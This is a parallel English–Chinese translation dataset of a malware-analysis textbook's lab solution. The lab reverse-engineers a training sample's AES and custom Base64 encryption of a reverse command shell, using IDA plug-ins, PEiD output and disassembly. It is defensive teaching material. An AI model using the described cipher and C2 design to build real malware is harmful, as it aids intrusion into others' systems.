  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-4459
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: Dynamic analysis might reveal some random-looking content that may be encoded.
    There are no recognizable strings in the program output, so nothing else suggests
    encoding.
  id: totrans-4460
  prefs: []
  type: TYPE_NORMAL
  zh: 动态分析可能会揭示一些看似随机的可能被编码的内容。程序输出中没有可识别的字符串，因此没有其他迹象表明存在编码。
- en: 2\.
  id: totrans-4461
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: Searching for xor instructions reveals six separate functions that may be associated
    with encoding, but the type of encoding is not immediately clear.
  id: totrans-4462
  prefs: []
  type: TYPE_NORMAL
  zh: 搜索 xor 指令揭示了可能与编码相关的六个不同的函数，但编码类型并不立即清楚。
- en: Solutions to Labs
  id: totrans-4463
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**617**'
  id: totrans-4464
  prefs: []
  type: TYPE_NORMAL
  zh: '**617**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4465
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 3\.
  id: totrans-4466
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: All three techniques identify the Advanced Encryption Standard (AES) algorithm
    (Rijndael algorithm), which is associated with all six of the XOR functions identified.
    The IDA Entropy Plugin also identifies a custom Base64 indexing string, which
    shows no evidence of association with xor instructions.
  id: totrans-4467
  prefs: []
  type: TYPE_NORMAL
  zh: 三种技术都识别了高级加密标准（AES）算法（Rijndael 算法），它与所识别的所有六个 XOR 函数相关联。IDA Entropy 插件还识别了一个自定义
    Base64 索引字符串，这表明没有与 xor 指令关联的证据。
- en: 4\.
  id: totrans-4468
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The malware uses AES and a custom Base64 cipher.
  id: totrans-4469
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用 AES 和自定义 Base64 加密。
- en: 5\.
  id: totrans-4470
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The key for AES is ijklmnopqrstuvwx. The key for the custom Base64
  id: totrans-4471
  prefs: []
  type: TYPE_NORMAL
  zh: AES 的密钥是 ijklmnopqrstuvwx。自定义 Base64 的密钥
- en: 'cipher is the index string:'
  id: totrans-4472
  prefs: []
  type: TYPE_NORMAL
  zh: 密码是索引字符串：
- en: CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/
  id: totrans-4473
  prefs: []
  type: TYPE_NORMAL
  zh: CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/
- en: 6\.
  id: totrans-4474
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The index string is sufficient for the custom Base64 implementation. For AES,
    variables other than the key may be needed to implement decryption, including
    the key-generation algorithm if one is used, the key size, the mode of operation,
    and the initialization vector if one is needed.
  id: totrans-4475
  prefs: []
  type: TYPE_NORMAL
  zh: 索引字符串对于自定义 Base64 实现是足够的。对于 AES，除了密钥之外可能还需要其他变量来实现解密，包括如果使用的话，密钥生成算法、密钥大小、操作模式以及如果需要的话，初始化向量。
- en: 7\.
  id: totrans-4476
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: The malware establishes a reverse command shell with the incoming commands decoded
    using the custom Base64 cipher and the outgoing command-shell responses encrypted
    with AES.
  id: totrans-4477
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用自定义 Base64 加密解码传入的命令，并使用 AES 加密加密命令外壳的传出命令外壳响应。
- en: 8\.
  id: totrans-4478
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: See the detailed analysis for an example of how to decrypt content.
  id: totrans-4479
  prefs: []
  type: TYPE_NORMAL
  zh: 查看详细分析以了解如何解密内容的示例。
- en: '***Detailed Analysis***'
  id: totrans-4480
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Starting with basic dynamic analysis, we see that the malware tries to resolve
    the domain name *www.practicalmalwareanalysis.com* and connect out on TCP
  id: totrans-4481
  prefs: []
  type: TYPE_NORMAL
  zh: 从基本的动态分析开始，我们看到恶意软件试图解析域名*www.practicalmalwareanalysis.com*并通过TCP连接出去
- en: 'port 8910 to that host. We use Netcat to send some content over the connection,
    and see the malware respond with some random content, but not with any recognizable
    strings. If we then terminate the socket from the Netcat side, we see a message
    like this:'
  id: totrans-4482
  prefs: []
  type: TYPE_NORMAL
  zh: 将端口号8910连接到该主机。我们使用Netcat通过连接发送一些内容，并看到恶意软件以一些随机内容响应，但没有任何可识别的字符串。如果我们随后从Netcat端终止套接字，我们会看到如下信息：
- en: 'ERROR: API = ReadConsole.'
  id: totrans-4483
  prefs: []
  type: TYPE_NORMAL
  zh: 错误：API = ReadConsole。
- en: error code = 0\.
  id: totrans-4484
  prefs: []
  type: TYPE_NORMAL
  zh: 错误代码 = 0。
- en: message = The operation completed successfully.
  id: totrans-4485
  prefs: []
  type: TYPE_NORMAL
  zh: message = 操作完成成功。
- en: 'Examining the output of strings, we see evidence related to all of the strings
    we have seen so far: www.practicalmalwareanalysis.com, ERROR: API ='
  id: totrans-4486
  prefs: []
  type: TYPE_NORMAL
  zh: 检查strings的输出，我们看到与我们迄今为止看到的所有字符串相关的证据：www.practicalmalwareanalysis.com，错误：API
    =
- en: '%s., error code = %d., message = %s., and ReadConsole. There are other relevant
    strings, like WriteConsole and DuplicateHandle, which may be part of error messages
    like the preceding ReadConsole error.'
  id: totrans-4487
  prefs: []
  type: TYPE_NORMAL
  zh: '%s，错误代码 = %d，信息 = %s，和ReadConsole。还有其他相关的字符串，如WriteConsole和DuplicateHandle，它们可能是前述ReadConsole错误信息的一部分。'
- en: The random content seen during dynamic analysis suggests that encoding is being
    used, although we can’t tell what is encoded. Certain strings suggest that the
    malware performs encryption, including Data not multiple of Block Size, Empty
    key, Incorrect key length, and Incorrect block length.
  id: totrans-4488
  prefs: []
  type: TYPE_NORMAL
  zh: 在动态分析期间看到的随机内容表明正在使用编码，尽管我们无法确定编码的内容。某些字符串表明恶意软件执行加密，包括数据不是块大小的倍数、空密钥、密钥长度不正确和块长度不正确。
- en: Examining the xor instructions and eliminating those associated with register
    clearing and library functions, we find six that contain xor. Given the large
    number of identified functions, let’s just label them for now and see how they
    correspond with the additional techniques we will apply. Table 13-2L
  id: totrans-4489
  prefs: []
  type: TYPE_NORMAL
  zh: 检查xor指令并消除与寄存器清除和库函数相关的指令，我们发现六个包含xor。鉴于已识别的函数数量众多，我们暂时给它们标记，并看看它们如何与我们将要应用的其他技术相对应。表13-2L
- en: summarizes how we rename the IDA Pro function names.
  id: totrans-4490
  prefs: []
  type: TYPE_NORMAL
  zh: 总结了如何重命名IDA Pro函数名。
- en: '**618**'
  id: totrans-4491
  prefs: []
  type: TYPE_NORMAL
  zh: '**618**'
- en: Appendix C
  id: totrans-4492
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4493
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Table 13-2L:** Functions Containing Suspect xor Instructions **Assigned Function
    Name**'
  id: totrans-4494
  prefs: []
  type: TYPE_NORMAL
  zh: '**表13-2L：包含可疑xor指令的函数 **分配的函数名**'
- en: '**Address of Function**'
  id: totrans-4495
  prefs: []
  type: TYPE_NORMAL
  zh: '**函数地址**'
- en: s_xor1
  id: totrans-4496
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor1
- en: 00401AC2
  id: totrans-4497
  prefs: []
  type: TYPE_NORMAL
  zh: 00401AC2
- en: s_xor2
  id: totrans-4498
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor2
- en: 0040223A
  id: totrans-4499
  prefs: []
  type: TYPE_NORMAL
  zh: 0040223A
- en: s_xor3
  id: totrans-4500
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor3
- en: 004027ED
  id: totrans-4501
  prefs: []
  type: TYPE_NORMAL
  zh: 004027ED
- en: s_xor4
  id: totrans-4502
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor4
- en: 00402DA8
  id: totrans-4503
  prefs: []
  type: TYPE_NORMAL
  zh: 00402DA8
- en: s_xor5
  id: totrans-4504
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor5
- en: '00403166'
  id: totrans-4505
  prefs: []
  type: TYPE_NORMAL
  zh: '00403166'
- en: s_xor6
  id: totrans-4506
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor6
- en: 00403990
  id: totrans-4507
  prefs: []
  type: TYPE_NORMAL
  zh: 00403990
- en: Using the FindCrypt2 plug-in for IDA Pro, we find the constants shown in Listing
    13-9L.
  id: totrans-4508
  prefs: []
  type: TYPE_NORMAL
  zh: 使用IDA Pro的FindCrypt2插件，我们找到了列表13-9L中显示的常量。
- en: '40CB08: found const array Rijndael_Te0 (used in Rijndael) 40CF08: found const
    array Rijndael_Te1 (used in Rijndael) 40D308: found const array Rijndael_Te2 (used
    in Rijndael) 40D708: found const array Rijndael_Te3 (used in Rijndael) 40DB08:
    found const array Rijndael_Td0 (used in Rijndael) 40DF08: found const array Rijndael_Td1
    (used in Rijndael) 40E308: found const array Rijndael_Td2 (used in Rijndael) 40E708:
    found const array Rijndael_Td3 (used in Rijndael) Found 8 known constant arrays
    in total.'
  id: totrans-4509
  prefs: []
  type: TYPE_NORMAL
  zh: '40CB08: 在Rijndael中找到const数组Rijndael_Te0（用于Rijndael） 40CF08: 在Rijndael中找到const数组Rijndael_Te1（用于Rijndael）
    40D308: 在Rijndael中找到const数组Rijndael_Te2（用于Rijndael） 40D708: 在Rijndael中找到const数组Rijndael_Te3（用于Rijndael）
    40DB08: 在Rijndael中找到const数组Rijndael_Td0（用于Rijndael） 40DF08: 在Rijndael中找到const数组Rijndael_Td1（用于Rijndael）
    40E308: 在Rijndael中找到const数组Rijndael_Td2（用于Rijndael） 40E708: 在Rijndael中找到const数组Rijndael_Td3（用于Rijndael）
    总共找到8个已知的常量数组。'
- en: '*Listing 13-9L: FindCrypt2 output*'
  id: totrans-4510
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表13-9L：FindCrypt2输出*'
- en: Listing 13-9L refers to Rijndael, the original name of the AES cipher.
  id: totrans-4511
  prefs: []
  type: TYPE_NORMAL
  zh: 列表13-9L指的是Rijndael，AES密码的原始名称。
- en: '**1 3**'
  id: totrans-4512
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 3**'
- en: After looking at the cross-references, it is clear that s_xor2 and s_xor4 are
    connected with the encryption constants (_TeX), and s_xor3 and s_xor5
  id: totrans-4513
  prefs: []
  type: TYPE_NORMAL
  zh: 在查看交叉引用后，很明显s_xor2和s_xor4与加密常量（_TeX）相关联，而s_xor3和s_xor5
- en: are connected with the decryption constants (_TdX).
  id: totrans-4514
  prefs: []
  type: TYPE_NORMAL
  zh: 与解密常量（_TdX）相关联。
- en: The PEiD KANAL plug-in reveals AES constants in a similar location.
  id: totrans-4515
  prefs: []
  type: TYPE_NORMAL
  zh: PEiD KANAL插件在类似位置揭示了AES常量。
- en: Listing 13-10L shows the output of the PEiD tool. PEiD’s identification of S
  id: totrans-4516
  prefs: []
  type: TYPE_NORMAL
  zh: 列表13-10L显示了PEiD工具的输出。PEiD对S的识别
- en: and S-inv refer to the S-box structures that are a basic component of some cryptographic
    algorithms.
  id: totrans-4517
  prefs: []
  type: TYPE_NORMAL
  zh: S和S-inv指的是某些加密算法的基本组件S-box结构。
- en: 'RIJNDAEL [S] [char] :: 0000C908 :: 0040C908'
  id: totrans-4518
  prefs: []
  type: TYPE_NORMAL
  zh: 'RIJNDAEL [S] [char] :: 0000C908 :: 0040C908'
- en: 'RIJNDAEL [S-inv] [char] :: 0000CA08 :: 0040CA08'
  id: totrans-4519
  prefs: []
  type: TYPE_NORMAL
  zh: 'RIJNDAEL [S-inv] [char] :: 0000CA08 :: 0040CA08'
- en: '*Listing 13-10L: PEiD KANAL output*'
  id: totrans-4520
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表13-10L：PEiD KANAL输出*'
- en: Finally, the IDA Entropy Plugin shows areas of high entropy. First, an examination
    of regions of high 8-bit entropy (256-bit chunk size with a minimum entropy value
    of 7.9) highlights the area between 0x0040C900
  id: totrans-4521
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，IDA熵插件显示了高熵区域。首先，检查高8位熵区域（256位块大小，最小熵值为7.9）突出了0x0040C900之间的区域。
- en: and 0x0040CB00—the same area previously identified as S-box regions.
  id: totrans-4522
  prefs: []
  type: TYPE_NORMAL
  zh: 和0x0040CB00——之前已识别为S-box区域的同一区域。
- en: Looking at regions of high 6-bit entropy (64-bit chunk size with a minimum entropy
    value of 5.95), we also find an area within the .data section between 0x004120A3
    and 0x004120A7, as shown in Figure 13-5L.
  id: totrans-4523
  prefs: []
  type: TYPE_NORMAL
  zh: 观察高6位熵区域（64位块大小，最小熵值为5.95），我们还在.data部分0x004120A3和0x004120A7之间找到一个区域，如图13-5L所示。
- en: Solutions to Labs
  id: totrans-4524
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**619**'
  id: totrans-4525
  prefs: []
  type: TYPE_NORMAL
  zh: '**619**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4526
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 138](index-653_1.png)'
  id: totrans-4527
  prefs: []
  type: TYPE_IMG
  zh: '![Image 138](index-653_1.png)'
- en: '![Image 139](index-653_2.png)'
  id: totrans-4528
  prefs: []
  type: TYPE_IMG
  zh: '![Image 139](index-653_2.png)'
- en: '*Figure 13-5L: IDA Entropy Plugin high 6-bit*'
  id: totrans-4529
  prefs: []
  type: TYPE_NORMAL
  zh: '*图13-5L：IDA熵插件高6位*'
- en: '*entropy findings*'
  id: totrans-4530
  prefs: []
  type: TYPE_NORMAL
  zh: '*熵发现*'
- en: 'Looking at the high entropy areas shown in Figure 13-5L, we see a string starting
    at 0x004120A4 that contains all 64 Base64 characters: CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/'
  id: totrans-4531
  prefs: []
  type: TYPE_NORMAL
  zh: 观察图13-5L中显示的高熵区域，我们看到从0x004120A4开始的字符串包含所有64个Base64字符：CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/
- en: Notice that this is not the standard Base64 string, because the capital AB
  id: totrans-4532
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，这不是标准的Base64字符串，因为大写AB
- en: and the lowercase ab have been moved to the back of their uppercase or lowercase
    sections. This malware may use a custom Base64-encoding algorithm.
  id: totrans-4533
  prefs: []
  type: TYPE_NORMAL
  zh: 小写字母ab已经移动到它们的大写或小写部分的后部。这种恶意软件可能使用自定义的Base64编码算法。
- en: Let’s review the relationship between the XOR-related functions we identified
    and other information we have collected. From the location of the Rijndael constants
    we’ve identified, it is clear that the s_xor2 and s_xor4 functions are related
    to AES encryption, and that the s_xor3 and s_xor5 functions are related to AES
    decryption.
  id: totrans-4534
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们回顾一下我们识别的与XOR相关的函数与其他收集到的信息之间的关系。从我们识别的Rijndael常数的位置来看，很明显，s_xor2和s_xor4函数与AES加密相关，而s_xor3和s_xor5函数与AES解密相关。
- en: The code inside the s_xor6 function is shown in Figure 13-6L.
  id: totrans-4535
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor6函数内部的代码如图13-6L所示。
- en: '*Figure 13-6L: XOR encoding loop in s_xor6*'
  id: totrans-4536
  prefs: []
  type: TYPE_NORMAL
  zh: '*图13-6L：s_xor6中的XOR编码循环*'
- en: '**620**'
  id: totrans-4537
  prefs: []
  type: TYPE_NORMAL
  zh: '**620**'
- en: Appendix C
  id: totrans-4538
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4539
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 140](index-654_1.png)'
  id: totrans-4540
  prefs: []
  type: TYPE_IMG
  zh: '![Image 140](index-654_1.png)'
- en: '![Image 141](index-654_2.png)'
  id: totrans-4541
  prefs: []
  type: TYPE_IMG
  zh: '![Image 141](index-654_2.png)'
- en: The loop in Figure 13-6L contains the xor instruction at  that shows that s_xor6
    is being used for XOR encoding. The variable arg_0 is a pointer to a source buffer
    that is being transformed, and arg_4 points to the buffer providing the XOR material.
    As the loop is followed, pointers to the two buffers (arg_0 and arg_4), as well
    as the counter var_4, are updated as shown by the three references at .
  id: totrans-4542
  prefs: []
  type: TYPE_NORMAL
  zh: 图13-6L中的循环包含在处的xor指令，这表明s_xor6被用于XOR编码。变量arg_0是指向一个正在转换的源缓冲区的指针，而arg_4指向提供XOR材料的缓冲区。随着循环的进行，两个缓冲区的指针（arg_0和arg_4）以及计数器var_4，如所示，都会更新。
- en: To determine if s_xor6 is related to the other encoding functions, we examine
    its cross-references. The function that calls s_xor6 starts at 0x0040352D. Figure
    13-7L shows a graph of the function cross-references from 0x0040352D.
  id: totrans-4543
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确定s_xor6是否与其它编码函数相关，我们检查它的交叉引用。调用s_xor6的函数从0x0040352D开始。图13-7L显示了从0x0040352D开始的函数交叉引用图。
- en: '*Figure 13-7L: Relationship of encryption functions*'
  id: totrans-4544
  prefs: []
  type: TYPE_NORMAL
  zh: '*图13-7L：加密函数之间的关系*'
- en: From this graph, we see that s_xor6 is indeed related to the other AES
  id: totrans-4545
  prefs: []
  type: TYPE_NORMAL
  zh: 从这张图中，我们可以看到s_xor6确实与其它AES
- en: encryption functions s_xor2 and s_xor4\.
  id: totrans-4546
  prefs: []
  type: TYPE_NORMAL
  zh: 加密函数s_xor2和s_xor4。
- en: Although we have evidence that s_xor3 and s_xor5 are related to AES
  id: totrans-4547
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管我们有证据表明s_xor3和s_xor5与AES
- en: '**1 3**'
  id: totrans-4548
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 3**'
- en: decryption, the relationship of these two functions to other functions is less
    clear. For example, when we look for the cross-reference to s_xor5, we see that
    the two locations from which s_xor5 is called (0x004037EE and 0x0040392D) appear
    to contain valid code, but the area is not defined as a function. This suggests
    that while AES code was linked to the malware, decryption is not used, and thus
    the decryption routines show up initially as dead code.
  id: totrans-4549
  prefs: []
  type: TYPE_NORMAL
  zh: 解密时，这两个函数与其他函数之间的关系不太明确。例如，当我们查找 s_xor5 的交叉引用时，我们看到 s_xor5 被调用的两个位置（0x004037EE
    和 0x0040392D）似乎包含有效的代码，但该区域未定义为函数。这表明虽然 AES 代码与恶意软件相关联，但解密并未使用，因此解密例程最初显示为死代码。
- en: Having identified the function from which s_xor5 is called (0x00403745) as a
    decryption function, we re-create a graph that shows all of the functions called
    from 0x00403745 (which we rename s_AES_decrypt) and 0x0040352D
  id: totrans-4550
  prefs: []
  type: TYPE_NORMAL
  zh: 已经将 s_xor5 被调用的函数（0x00403745）识别为解密函数后，我们重新创建了一个图，显示了从 0x00403745（我们将其重命名为 s_AES_decrypt）和
    0x0040352D
- en: (which we rename s_AES_encrypt), as shown in Figure 13-8L.
  id: totrans-4551
  prefs: []
  type: TYPE_NORMAL
  zh: （我们将其重命名为 s_AES_encrypt），如图 13-8L 所示。
- en: '*Figure 13-8L: Relationship of XOR functions to AES*'
  id: totrans-4552
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 13-8L：XOR 函数与 AES 的关系*'
- en: Solutions to Labs
  id: totrans-4553
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**621**'
  id: totrans-4554
  prefs: []
  type: TYPE_NORMAL
  zh: '**621**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4555
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: This graph shows more clearly the relationship among all of the AES
  id: totrans-4556
  prefs: []
  type: TYPE_NORMAL
  zh: 这个图更清楚地显示了所有 AES
- en: functions, and in it we can see that all XOR functions other than s_xor1 are
    related to the AES implementation.
  id: totrans-4557
  prefs: []
  type: TYPE_NORMAL
  zh: 函数的可能使用，并且在其中我们可以看到，除了 s_xor1 之外的所有 XOR 函数都与 AES 实现相关。
- en: Looking at s_xor1, we see several early branches in the code that occur when
    the arguments are incorrect, and luckily the malware still has the error messages
    present. These error messages include Empty key, Incorrect key length, and Incorrect
    block length, implying that this is the key initialization code.
  id: totrans-4558
  prefs: []
  type: TYPE_NORMAL
  zh: 查看 s_xor1，我们看到代码中存在几个早期分支，这些分支发生在参数不正确时，幸运的是，恶意软件仍然保留了错误消息。这些错误消息包括 Empty key（空密钥）、Incorrect
    key length（密钥长度不正确）和 Incorrect block length（块长度不正确），这表明这是密钥初始化代码。
- en: To confirm that we’ve identified the key initialization code, we can try to
    find a connection between this function and the previously identified AES functions.
    Looking at the calling function for s_xor1, we see that just before s_xor1 is
    called, there is a reference to unk_412EF8\. This offset is passed to the s_xor1
    function using ECX. Looking at other references to unk_412EF8, we find that 0x401429
    is one of the places that the offset of unk_412EF8 is loaded into ECX, just before
    the call to s_AES_encrypt. The address unk_412EF8
  id: totrans-4559
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确认我们已经识别出密钥初始化代码，我们可以尝试找到该函数与之前识别的 AES 函数之间的联系。查看 s_xor1 的调用函数，我们看到在调用 s_xor1
    之前，有一个对 unk_412EF8 的引用。这个偏移量使用 ECX 传递给 s_xor1 函数。查看对 unk_412EF8 的其他引用，我们发现 0x401429
    是将 unk_412EF8 的偏移量加载到 ECX 的位置之一，在调用 s_AES_encrypt 之前。地址 unk_412EF8
- en: must be a C++ object representing the AES encryptor, and s_xor1 is the initialization
    function for that encryptor.
  id: totrans-4560
  prefs: []
  type: TYPE_NORMAL
  zh: 必须是一个表示 AES 加密器的 C++ 对象，并且 s_xor1 是该加密器的初始化函数。
- en: Looking back at s_xor1, we see that the Empty key message is issued after a
    test of the arg_0 parameter. From this, we can assume that the arg_0 parameter
    is the key. Looking at the parameter setup in main near the call to s_xor1
  id: totrans-4561
  prefs: []
  type: TYPE_NORMAL
  zh: 回顾 s_xor1，我们看到在测试 arg_0 参数之后发出了 Empty key 消息。从这一点，我们可以假设 arg_0 参数是密钥。查看 main
    函数中 s_xor1 调用附近的参数设置
- en: (at 0x401895), we can associate arg_0 with the string ijklmnopqrstuvwx, which
    is pushed on the stack. This string is the key used for AES in this malware.
  id: totrans-4562
  prefs: []
  type: TYPE_NORMAL
  zh: （在 0x401895 处），我们可以将 arg_0 与字符串 ijklmnopqrstuvwx 关联，该字符串被推入堆栈。这个字符串是恶意软件中 AES
    所使用的密钥。
- en: 'Here’s a review of what we know about how AES is used in this malware:'
  id: totrans-4563
  prefs: []
  type: TYPE_NORMAL
  zh: 这里是对我们在恶意软件中使用 AES 的了解的回顾：
- en: 
  id: totrans-4564
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: s_AES_encrypt is used in the function at 0x0040132B. The encryption occurs between
    a call to ReadFile and a call to WriteFile.
  id: totrans-4565
  prefs: []
  type: TYPE_NORMAL
  zh: s_AES_encrypt 在 0x0040132B 处的函数中使用。加密发生在调用 ReadFile 和调用 WriteFile 之间。
- en: 
  id: totrans-4566
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: s_xor1 is the AES initialization function that occurs once at the start of the
    process.
  id: totrans-4567
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor1 是在进程开始时发生一次的 AES 初始化函数。
- en: 
  id: totrans-4568
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: s_xor1 sets the AES password as ijklmnopqrstuvwx.
  id: totrans-4569
  prefs: []
  type: TYPE_NORMAL
  zh: s_xor1 将 AES 密码设置为 ijklmnopqrstuvwx。
- en: In addition to AES, we identified the possible use of a custom Base64
  id: totrans-4570
  prefs: []
  type: TYPE_NORMAL
  zh: 除了 AES 之外，我们还确定了自定义 Base64
- en: cipher with the use of the IDA Entropy Plugin (indicated in Figure 13-5L).
  id: totrans-4571
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 IDA Entropy 插件（如图 13-5L 所示）对密文进行加密。
- en: Examining the references to the string CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijkl
    mnopqrstuvwxyzab0123456789+/, we learn that this string is in the function at
    0x0040103F. This function does the indexed lookup into the string, and the calling
    function (at 0x00401082) divides the string to be decoded into 4-byte chunks.
    The function at 0x00401082 then is the custom Base64 decode function, and we can
    see in the function that calls it (0x0040147C) that the decode function lies in
    between a ReadFile and a WriteFile. This is the same pattern we saw for the use
    of AES, but in a different function.
  id: totrans-4572
  prefs: []
  type: TYPE_NORMAL
  zh: 检查字符串 CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijkl mnopqrstuvwxyzab0123456789+/, 我们了解到这个字符串位于
    0x0040103F 函数中。这个函数执行字符串的索引查找，调用函数（在 0x00401082）将待解码的字符串分割成 4 字节块。0x00401082 函数是自定义的
    Base64 解码函数，我们可以在调用它的函数（0x0040147C）中看到解码函数位于 ReadFile 和 WriteFile 之间。这与我们看到的 AES
    使用模式相同，但位于不同的函数中。
- en: Before we can decrypt content, we need to determine the connection between the
    content and encoding algorithm. As we know, the AES encryption function is used
    by the function starting at 0x0040132B. Looking at the function that calls the
    function at 0x0040132B in Listing 13-11L, we see that 0x0040132B is the start
    of a new thread created with the CreateThread shown at , so we rename 0x0040132B
    to aes_thread.
  id: totrans-4573
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们能够解密内容之前，我们需要确定内容与编码算法之间的联系。正如我们所知，AES 加密函数由从 0x0040132B 开始的函数使用。查看列表 13-11L
    中调用 0x0040132B 函数的函数，我们看到 0x0040132B 是使用 CreateThread 创建的新线程的开始，因此我们将 0x0040132B
    重命名为 aes_thread。
- en: '**622**'
  id: totrans-4574
  prefs: []
  type: TYPE_NORMAL
  zh: '**622**'
- en: Appendix C
  id: totrans-4575
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4576
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00401823 mov eax, [ebp+var_18]
  id: totrans-4577
  prefs: []
  type: TYPE_NORMAL
  zh: 00401823 mov eax, [ebp+var_18]
- en: 00401826 mov [ebp+var_58], eax 
  id: totrans-4578
  prefs: []
  type: TYPE_NORMAL
  zh: 00401826 mov [ebp+var_58], eax 
- en: 00401829 mov ecx, [ebp+arg_10]
  id: totrans-4579
  prefs: []
  type: TYPE_NORMAL
  zh: 00401829 mov ecx, [ebp+arg_10]
- en: 0040182C mov [ebp+var_54], ecx 
  id: totrans-4580
  prefs: []
  type: TYPE_NORMAL
  zh: 0040182C mov [ebp+var_54], ecx 
- en: 0040182F mov edx, dword_41336C
  id: totrans-4581
  prefs: []
  type: TYPE_NORMAL
  zh: 0040182F mov edx, dword_41336C
- en: 00401835 mov [ebp+var_50], edx 
  id: totrans-4582
  prefs: []
  type: TYPE_NORMAL
  zh: 00401835 mov [ebp+var_50], edx 
- en: 00401838 lea eax, [ebp+var_3C]
  id: totrans-4583
  prefs: []
  type: TYPE_NORMAL
  zh: 00401838 lea eax, [ebp+var_3C]
- en: 0040183B push eax ; lpThreadId 0040183C push 0 ; dwCreationFlags 0040183E lea
    ecx, [ebp+var_58]
  id: totrans-4584
  prefs: []
  type: TYPE_NORMAL
  zh: 0040183B push eax ; lpThreadId 0040183C push 0 ; dwCreationFlags 0040183E lea
    ecx, [ebp+var_58]
- en: 00401841 push ecx ; lpParameter 00401842 push offset aes_thread ; lpStartAddress
    00401847 push 0 ; dwStackSize 00401849 push 0 ; lpThreadAttributes 0040184B call
    ds:CreateThread 
  id: totrans-4585
  prefs: []
  type: TYPE_NORMAL
  zh: 00401841 push ecx ; lpParameter 00401842 push offset aes_thread ; lpStartAddress
    00401847 push 0 ; dwStackSize 00401849 push 0 ; lpThreadAttributes 0040184B call
    ds:CreateThread 
- en: '*Listing 13-11L: Parameters to CreateThread for aes_thread* The parameters
    to the thread start function are passed as the location of var_58, and we see
    three variables pushed onto the stack relative to var_58 as follows:'
  id: totrans-4586
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-11L：aes_thread 的 CreateThread 参数* 线程启动函数的参数作为 var_58 的位置传递，我们看到相对于 var_58
    有三个变量被推入堆栈，如下所示：'
- en: 
  id: totrans-4587
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: var_18 is moved to var_58 at .
  id: totrans-4588
  prefs: []
  type: TYPE_NORMAL
  zh: var_18 被移动到 var_58 在 .
- en: 
  id: totrans-4589
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: arg_10 is moved to var_54 at .
  id: totrans-4590
  prefs: []
  type: TYPE_NORMAL
  zh: arg_10 被移动到 var_54 在 .
- en: 
  id: totrans-4591
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: dword_41336C is moved to var_50 at .
  id: totrans-4592
  prefs: []
  type: TYPE_NORMAL
  zh: dword_41336C 被移动到 var_50 在 .
- en: In aes_thread (0x40132B), we see how the parameters are used. Listing 13-1 3
  id: totrans-4593
  prefs: []
  type: TYPE_NORMAL
